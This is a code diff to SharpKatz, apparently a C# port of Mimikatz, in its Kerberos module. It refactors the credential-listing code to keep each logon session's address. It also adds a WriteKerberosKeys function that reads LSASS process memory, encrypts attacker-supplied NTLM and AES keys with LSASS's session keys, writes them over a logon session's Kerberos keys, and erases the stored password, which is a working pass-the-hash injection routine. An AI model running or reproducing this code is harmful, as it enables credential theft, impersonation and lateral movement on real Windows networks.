@@ -9,12 +9,12 @@ using SharpKatz.Crypto;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Text;
 using static SharpKatz.Module.Msv1;
-using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
+using static SharpKatz.Module.Pth;
 using static SharpKatz.Win32.Natives;
+using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
 
 namespace SharpKatz.Module
 {
@@ -327,24 +327,24 @@ namespace SharpKatz.Module
             public uint KeyOffset;
         }
 
-        public static List<byte[]> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static List<KerberosLogonItem> FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             IntPtr kerbUnloadLogonSessionTableAddr;
             kerbUnloadLogonSessionTableAddr = Utility.GetListAdress(hLsass, msvMem, "kerberos.dll", max_search_size, oshelper.KerbUnloadLogonSessionTableOffset, oshelper.KerbUnloadLogonSessionTableSign);
 
-            GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
+            //GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist);
 
             return GetKerberosLogonList(ref hLsass, kerbUnloadLogonSessionTableAddr, oshelper, iv, aeskey, deskey, logonlist); ;
         }
 
-        private static List<byte[]> GetKerberosLogonList(ref IntPtr hLsass, IntPtr kerbUnloadLogonSessionTableAddr, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        private static List<KerberosLogonItem> GetKerberosLogonList(ref IntPtr hLsass, IntPtr kerbUnloadLogonSessionTableAddr, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
-            List<byte[]> klogonlist = new List<byte[]>();
+            List<KerberosLogonItem> klogonlist = new List<KerberosLogonItem>();
             WalkAVLTables(ref hLsass, kerbUnloadLogonSessionTableAddr, klogonlist, oshelper, iv, aeskey, deskey, logonlist);
             return klogonlist;
         }
 
-        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<byte[]> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<KerberosLogonItem> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             if (pElement == null)
                 return;
@@ -356,7 +356,10 @@ namespace SharpKatz.Module
             {
                 byte[] krbrLogonSessionBytes = Utility.ReadFromLsass(ref hLsass, entry.OrderedPointer, Convert.ToUInt64(oshelper.LogonSessionTypeSize));
 
-                klogonlist.Add(krbrLogonSessionBytes);
+                KerberosLogonItem item = new KerberosLogonItem();
+                item.LogonSessionAddress = entry.OrderedPointer;
+                item.LogonSessionBytes = krbrLogonSessionBytes;
+                klogonlist.Add(item);
             }
 
             if (entry.BalancedRoot.RightChild != IntPtr.Zero)
@@ -366,7 +369,7 @@ namespace SharpKatz.Module
 
         }
 
-        public static void GetCredentials(ref IntPtr hLsass,byte[] entry, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
+        public static void GetCredentials(ref IntPtr hLsass, byte[] entry, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
 
             if (entry == null)
@@ -460,7 +463,7 @@ namespace SharpKatz.Module
 
             byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))));
 
-            int items = BitConverter.ToInt32(keylistBytes,Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
+            int items = BitConverter.ToInt32(keylistBytes, Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
             int structsize = Marshal.SizeOf(kerberoshshtype);
 
             int readsize = items * structsize;
@@ -518,12 +521,113 @@ namespace SharpKatz.Module
                 {
                     kkey.Key = "<no size, buffer is incorrect>";
                 }
-                
+
                 Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
 
                 if (currentlogon.KerberosKeys == null)
                     currentlogon.KerberosKeys = new List<KerberosKey>();
                 currentlogon.KerberosKeys.Add(kkey);
+            }
+        }
+
+        public static void WriteKerberosKeys(ref IntPtr hLsass, KerberosLogonItem krbrLogonSession, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, ref SEKURLSA_PTH_DATA pthData)
+        {
+            Type kerberossessiontype = oshelper.KerberosLogonSessionType;
+            Type kerberoshshtype = oshelper.KerberosHashType;
+
+            byte[] krbrLogonSessionBites = krbrLogonSession.LogonSessionBytes;
+
+            byte[] encNtlmHashBytes = null;
+            byte[] encAes128Bytes = null;
+            byte[] encAes256Bytes = null;
+
+            IntPtr pKeyList = new IntPtr(BitConverter.ToInt64(krbrLogonSessionBites, oshelper.KerberosLogonSessionKeyListOffset));
+
+            if (pKeyList == null)
+                return;
+
+            LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSessionBites, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
+
+            if (pthData.LogonId.HighPart != luid.HighPart || pthData.LogonId.LowPart != luid.LowPart)
+                return;
+
+            byte[] keylistBytes = Utility.ReadFromLsass(ref hLsass, pKeyList, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))));
+
+            if (pthData.NtlmHash != null)
+            {
+                encNtlmHashBytes = Crypto.BCrypt.EncryptCredentials(pthData.NtlmHash, iv, aeskey, deskey);
+            }
+            if (pthData.Aes128Key != null)
+            {
+                encAes128Bytes = Crypto.BCrypt.EncryptCredentials(pthData.Aes128Key, iv, aeskey, deskey);
+            }
+            if (pthData.Aes256Key != null)
+            {
+                encAes256Bytes = Crypto.BCrypt.EncryptCredentials(pthData.Aes256Key, iv, aeskey, deskey);
+            }
+
+            int items = BitConverter.ToInt32(keylistBytes, Utility.FieldOffset<KIWI_KERBEROS_KEYS_LIST_6>("cbItem"));
+            int structsize = Marshal.SizeOf(kerberoshshtype);
+
+            int readsize = items * structsize;
+
+            byte[] hashpassBytes = Utility.ReadFromLsass(ref hLsass, IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))), (ulong)readsize);
+
+            Console.WriteLine("[*]  \\_ kerberos - data copy @ {0:X}", IntPtr.Add(pKeyList, Marshal.SizeOf(typeof(KIWI_KERBEROS_KEYS_LIST_6))).ToInt64());
+
+            pthData.isReplaceOk = true;
+            for (int i = 0; (i < items) && pthData.isReplaceOk; i++)
+            {
+
+                byte[] bytesToWrite = null;
+
+                int currentindex = (i * structsize) + oshelper.KerberosHashGenericOffset;
+
+                byte[] entryBytes = Utility.GetBytes(hashpassBytes, currentindex, Marshal.SizeOf(typeof(KERB_HASHPASSWORD_GENERIC)));
+
+                KERB_HASHPASSWORD_GENERIC entry = Utility.ReadStruct<KERB_HASHPASSWORD_GENERIC>(entryBytes);
+
+                string keyentry = KerberosTicketEtype((int)entry.Type);
+
+                UNICODE_STRING checksum = new UNICODE_STRING
+                {
+                    Length = (ushort)entry.Size,
+                    MaximumLength = (ushort)entry.Size,
+                    Buffer = entry.Checksump
+                };
+
+                if (encNtlmHashBytes != null && ((entry.Type != KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && (entry.Type != KERB_ETYPE_AES256_CTS_HMAC_SHA1_96)) && ((int)entry.Size == LM_NTLM_HASH_LENGTH))
+                {
+                    bytesToWrite = encNtlmHashBytes;
+                }
+                else if (encAes128Bytes != null && (entry.Type == KERB_ETYPE_AES128_CTS_HMAC_SHA1_96) && ((int)entry.Size == AES_128_KEY_LENGTH))
+                {
+                    bytesToWrite = encAes128Bytes;
+                }
+                else if (encAes256Bytes != null && (entry.Type == KERB_ETYPE_AES256_CTS_HMAC_SHA1_96) && ((int)entry.Size == AES_256_KEY_LENGTH))
+                {
+                    bytesToWrite = encAes256Bytes;
+                }
+                else
+                {
+                    Console.WriteLine("[*]    \\_ {0} -> null", keyentry);
+                }
+
+                if (bytesToWrite != null)
+                {
+                    pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, checksum.Buffer, bytesToWrite);
+                    Console.WriteLine("[*]    \\_ {0} {1} ", keyentry, (pthData.isReplaceOk) ? "OK" : "null");
+                }
+            }
+
+            if (pthData.isReplaceOk)
+            {
+                byte[] pasreplace = new byte[oshelper.KerberosPasswordEraseSize];
+
+                Console.WriteLine("[*]    \\_ *Password replace @ {0:X} ({1}) -> null", IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase).ToInt64(), oshelper.KerberosPasswordEraseSize);
+
+                pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, IntPtr.Add(krbrLogonSession.LogonSessionAddress, oshelper.KerberosOffsetPasswordErase), pasreplace);
+                
             }
         }
 
@@ -583,8 +687,8 @@ namespace SharpKatz.Module
 
             sb.Append(string.Format("\n\t   * LSA Isolated Data: %.*S", blob.typeSize, Marshal.PtrToStringAuto(pntData)));
 
-            sb.Append(string.Format("\n\t     Unk-Key  : {0}",Utility.PrintHexBytes(unkKeyData)));
-            sb.Append(string.Format("\n\t     Encrypted: ",Utility.PrintHexBytes(encrypted)));
+            sb.Append(string.Format("\n\t     Unk-Key  : {0}", Utility.PrintHexBytes(unkKeyData)));
+            sb.Append(string.Format("\n\t     Encrypted: ", Utility.PrintHexBytes(encrypted)));
             sb.Append(string.Format("\n\t\t   SS:{0}, TS:{1}, DS:{2}", blob.structSize, blob.typeSize, blob.origSize));
             sb.Append(string.Format("\n\t\t   0:0x%x, 1:0x{0:X}, 2:0x{1:X}, 3:0x{2:X}, 4:0x{3:X}, E:", blob.unk0, blob.unk1, blob.unk2, blob.unk3, blob.unk4));
             sb.Append(string.Format(Utility.PrintHexBytes(unkData2)));
@@ -615,5 +719,12 @@ namespace SharpKatz.Module
 
             return sb.ToString();
         }
+
+        public class KerberosLogonItem
+        {
+            public IntPtr LogonSessionAddress { get; set; }
+            public byte[] LogonSessionBytes { get; set; }
+        }
+
     }
 }
